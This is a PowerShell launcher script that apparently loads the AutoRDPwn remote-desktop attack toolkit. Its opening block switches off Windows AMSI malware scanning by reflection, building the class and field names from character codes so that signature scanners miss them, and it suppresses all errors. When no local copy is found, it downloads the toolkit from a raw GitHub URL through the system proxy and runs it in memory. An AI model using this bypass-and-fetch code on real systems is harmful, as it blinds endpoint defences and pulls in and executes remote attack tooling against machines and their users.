$ErrorActionPreference = "SilentlyContinue"
try {
  $amsiUtils = [Ref].Assembly.GetType(('System.Management.Automation.' + [char]65 + 'msiUtils'))
  $amsiInit = [char]97 + 'msiInitFailed'
  $amsiUtils.GetField($amsiInit, [Reflection.BindingFlags]'NonPublic,Static').SetValue($null, $true)
} catch { }

$scriptPath = $null
if ($PSScriptRoot -and (Test-Path "$PSScriptRoot\..\..\AutoRDPwn.ps1")) {
  $scriptPath = Resolve-Path "$PSScriptRoot\..\..\AutoRDPwn.ps1"
}

if ($scriptPath) {
  & $scriptPath @args
} else {
  $webclient = New-Object System.Net.WebClient
  $webclient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
  $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
  $content = $webclient.DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1')
  $main = [System.Management.Automation.Language.Parser]::ParseInput($content, [ref]$null, [ref]$null)
  $block = [System.Management.Automation.ScriptBlock]::Create($content)
  & $block @args
}
